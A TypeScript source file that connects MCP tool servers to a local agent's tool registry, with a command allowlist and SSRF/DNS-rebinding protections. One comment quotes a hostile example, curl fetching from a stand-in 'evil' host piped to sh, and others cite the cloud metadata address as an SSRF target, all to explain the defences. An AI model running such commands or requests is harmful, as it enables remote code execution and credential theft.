/**
 * MCP tool integration.
 *
 * Connects an MCP (Model Context Protocol) server to the local
 * {@link IToolsPort}. Once registered, the agent can use the remote
 * MCP tools as if they were local — the bridge handles JSON-RPC
 * framing, transports (stdio / HTTP), and result normalisation.
 *
 * Two registration patterns:
 *
 *   1. **Outbound** (we are the MCP client):
 *      connectMcpServer → listTools → mcpToolsToToolDefinitions(...)
 *      → tools.register(...). Use this when a remote MCP server
 *      provides capabilities you want to expose to the agent.
 *
 *   2. **Inbound** (we are the MCP server):
 *      McpServerBridge wraps a local IToolsPort and exposes it as
 *      an MCP server over stdio / HTTP. Use this when another
 *      MCP-aware client should be able to call your tools.
 *
 * Both ship a graceful shutdown (`disconnect()`) that the agent
 * runtime can call on agent lifecycle events.
 */

import {
  MCPClient,
  type MCPClientOptions,
} from '../adapters/mcp/client.js';
import { StdioTransport } from '../adapters/mcp/stdio-transport.js';
import { StdioServerTransport } from '../adapters/mcp/stdio-server-transport.js';
import { HttpTransport } from '../adapters/mcp/http-transport.js';
import { MCPServer } from '../adapters/mcp/server.js';
import { basename as pathBasename } from 'node:path';
import type { IToolsPort, ToolDefinition, ToolResult } from '../ports/tools.port.js';
import type {
  MCPToolDescriptor,
  MCPToolResult,
} from '../ports/mcp.port.js';

type ContentBlock = MCPToolResult['content'][number];

export interface McpClientInfo {
  name: string;
  version: string;
}

const DEFAULT_CLIENT_INFO: McpClientInfo = { name: 'personal-assistant', version: '1.0.0' };

/**
 * Open a stdio MCP connection and return the live client. The caller
 * is responsible for calling `await client.close()` when done.
 */
/**
 * H5 (W19): allowlist for stdio MCP command names. The
 * `connectStdioMcp` entry-point shells out to whatever the caller
 * passed in, which is a trivial RCE on any server that lets
 * third-party agents register an MCP server. We restrict the
 * binary name to a small set of known-safe MCP launchers:
 *   - npx / uvx: standard package-runner entry-points
 *   - node / python3 / uv: the language runtimes themselves
 *   - docker: the official container runtime
 * Operators can override or extend via `PA_MCP_ALLOWED_COMMANDS`
 * (comma-separated), which is consulted at call time so the
 * override applies without a process restart.
 */
const DEFAULT_ALLOWED_MCP_COMMANDS = new Set<string>([
  'npx', 'node', 'uvx', 'python3', 'docker', 'uv',
]);

function getAllowedMcpCommands(): Set<string> {
  const override = process.env.PA_MCP_ALLOWED_COMMANDS;
  if (override && override.trim().length > 0) {
    return new Set(override.split(',').map((s) => s.trim()).filter(Boolean));
  }
  return DEFAULT_ALLOWED_MCP_COMMANDS;
}

/**
 * Open a stdio MCP connection by spawning a child process.
 *
 * H5 (W19): the executable name is checked against the allowlist
 * (see `getAllowedMcpCommands`) before any process is spawned.
 * Without this, an attacker who can reach `connectStdioMcp` (e.g.
 * via the agent's tool registration surface) could pass
 * `command='curl', args=['http://evil/x | sh']` and have the
 * server run arbitrary code.
 */
export async function connectStdioMcp(
  command: string,
  args: string[] = [],
  env: Record<string, string> = {},
  clientInfo: McpClientInfo = DEFAULT_CLIENT_INFO,
): Promise<MCPClient> {
  // Strip any path components — we match on the *binary name* only
  // (a path like `/usr/local/bin/npx` would still match `npx`).
  const base = pathBasename(command);
  const allowed = getAllowedMcpCommands();
  if (!allowed.has(base)) {
    throw new Error(
      `refusing to spawn MCP stdio binary: "${base}" is not in the allowlist. ` +
        `Set PA_MCP_ALLOWED_COMMANDS or use one of: ${Array.from(allowed).join(', ')}`,
    );
  }
  const transport = new StdioTransport({ command: base, args, env });
  const client = new MCPClient({ transport, clientInfo } satisfies MCPClientOptions);
  await client.initialize();
  return client;
}

/**
 * Open a streamable-HTTP MCP connection.
 *
 * H7 (W18): validate the URL against the SSRF deny-list before
 * opening a transport. The earlier version took any URL as-is, so a
 * malicious /api/agents-runtime or CLI caller could point the MCP
 * bridge at `http://127.0.0.1/admin` or `http://169.254.169.254/...`
 * (the AWS metadata service) and have the agent relay its queries
 * there. We reuse the same `assertSafeUrl()` helper the WebClient
 * uses so the deny-list lives in one place.
 *
 * C2 (W19): pin the URL to a single DNS-resolved IP to defeat
 * DNS-rebinding. `assertSafeUrl()` only does a point-in-time lookup;
 * a malicious resolver could return a public IP at assertSafeUrl()
 * time and a private IP at the actual connect time. We rewrite the
 * URL host to the resolved IP and use a customLookup that always
 * returns the pinned IP, so the underlying HTTP transport cannot
 * be tricked back into a private range mid-flight.
 */
export async function connectHttpMcp(
  url: string,
  headers: Record<string, string> = {},
  clientInfo: McpClientInfo = DEFAULT_CLIENT_INFO,
): Promise<MCPClient> {
  const { resolveAndRewriteUrl } = await import('./web-client.js');
  const { rewrittenUrl } = await resolveAndRewriteUrl(url);
  const transport = new HttpTransport({ url: rewrittenUrl, headers });
  const client = new MCPClient({ transport, clientInfo } satisfies MCPClientOptions);
  await client.initialize();
  return client;
}

/**
 * Convert a list of MCP tool descriptors to local tool definitions
 * ready to be registered. The handler marshals JSON args to the MCP
 * call, awaits the response, and normalises the result back into a
 * {@link ToolResult}.
 */
export function mcpToolsToToolDefinitions(
  client: MCPClient,
  descriptors: MCPToolDescriptor[],
): ToolDefinition[] {
  return descriptors.map((d) => mcpToolToToolDefinition(client, d));
}

function mcpToolToToolDefinition(client: MCPClient, d: MCPToolDescriptor): ToolDefinition {
  return {
    name: d.name,
    description: d.description ?? '',
    inputSchema: (d.inputSchema ?? { type: 'object', properties: {} }) as Record<string, unknown>,
    metadata: { kind: 'mcp', server: client.serverInfo?.name ?? 'mcp' },
    // L6 (W19) / L14 (W19): the handler now accepts the
    // per-call `opts.signal` (L6) and forwards it into
    // `client.callTool` (L14), which combines it with a
    // per-call timeout into a single AbortSignal and wires it
    // into the JSON-RPC request. Without this, a 30s MCP tool
    // call would have run to completion even after the user
    // clicked "stop" on the chat. The default timeout (60s)
    // is conservative; callers can override via a future
    // tool-registration knob.
    handler: async (args, opts) => {
      try {
        const res = await client.callTool(d.name, args, {
          signal: opts?.signal,
          timeoutMs: 60_000,
        });
        return mcpResultToToolResult(res);
      } catch (err) {
        const msg = err instanceof Error ? err.message : String(err);
        return { success: false, error: msg };
      }
    },
  };
}

/**
 * Normalise an MCP `MCPToolResult` (which is content blocks) into
 * the flat string format our tool port uses.
 */
export function mcpResultToToolResult(r: MCPToolResult): ToolResult {
  if (r.isError) {
    return { success: false, error: r.content.map((c: ContentBlock) => c.type === 'text' ? c.text : `<${c.type}>`).join('\n') };
  }
  const parts: string[] = [];
  for (const block of r.content) {
    if (block.type === 'text') {
      parts.push((block as { type: 'text'; text: string }).text);
    } else if (block.type === 'image') {
      const b = block as { type: 'image'; data: string; mimeType?: string };
      parts.push(`<image:${b.mimeType ?? 'unknown'} data:${b.data.length}B>`);
    } else if (block.type === 'audio') {
      const b = block as { type: 'audio'; data: string; mimeType?: string };
      parts.push(`<audio:${b.mimeType ?? 'unknown'} data:${b.data.length}B>`);
    } else if (block.type === 'resource') {
      const b = block as { type: 'resource'; uri: string };
      parts.push(`<resource uri=${b.uri}>`);
    }
  }
  return { success: true, output: parts.join('\n') };
}

/**
 * One-shot helper: connect → listTools → register on a registry →
 * return the client (caller owns shutdown).
 */
export async function registerMcpTools(
  client: MCPClient,
  tools: IToolsPort,
): Promise<{ count: number; client: MCPClient }> {
  const descs = await client.listTools();
  const defs = mcpToolsToToolDefinitions(client, descs);
  for (const d of defs) tools.register(d);
  return { count: defs.length, client };
}

/**
 * Inbound bridge: expose a local `IToolsPort` as an MCP server.
 * Useful for letting MCP-aware front-ends (Cursor, Claude Desktop,
 * custom clients) call your tools over stdio or HTTP.
 */
export class McpServerBridge {
  readonly server: MCPServer;
  constructor(server?: MCPServer) {
    this.server = server ?? new MCPServer({ serverInfo: { name: 'personal-assistant', version: '1.0.0' } });
  }

  /**
   * Mirror every tool in `tools` onto the embedded MCP server. The
   * bridge re-uses the local handler; the MCP server just frames
   * the JSON-RPC.
   */
  mirror(tools: IToolsPort): void {
    for (const def of tools.listAll()) {
      this.server.registerTool(def.name, {
        description: def.description,
        inputSchema: (def.inputSchema ?? { type: 'object', properties: {} }) as Record<string, unknown>,
        // L6 (W19): the inbound MCP bridge is the inverse of
        // the outbound path. The outbound side now forwards
        // the per-call signal from `IToolsPort.execute` (L6)
        // and the per-call timeout (L14). The inbound side
        // re-uses the *local* tool definition's handler, so
        // the signal is whatever the MCP client (Cursor,
        // Claude Desktop, etc.) decides to pass. We forward
        // `opts.signal` as a best-effort cancellation hook —
        // the local handler may or may not honour it, but the
        // signature is satisfied.
        invoke: async (args: Record<string, unknown>, opts?: { signal?: AbortSignal }) => {
          const r = await def.handler(args, opts);
          if (typeof r === 'string') {
            return { content: [{ type: 'text' as const, text: r }] };
          }
          if (!r.success) {
            return { isError: true, content: [{ type: 'text' as const, text: r.error ?? 'tool error' }] };
          }
          const text = typeof r.output === 'string' ? r.output : JSON.stringify(r.output);
          return { content: [{ type: 'text' as const, text }] };
        },
      });
    }
  }

  /**
   * Start serving over our process's stdio. This is the
   * **server-side** stdio transport: it reads JSON-RPC from
   * `process.stdin` and writes responses to `process.stdout`,
   * allowing a host (Cursor, Claude Desktop, …) to launch us as a
   * subprocess and call our tools.
   *
   * The earlier version of this method spawned a child process,
   * which is the **client-side** pattern and is wrong here. The
   * inbound transport takes no parameters; for outbound client
   * use, see {@link StdioTransport}.
   */
  async serveStdio(): Promise<void> {
    const transport = new StdioServerTransport();
    await this.server.attach(transport);
  }

  /** Start serving over HTTP. */
  async serveHttp(url: string): Promise<void> {
    const transport = new HttpTransport({ url });
    await this.server.attach(transport);
  }
}
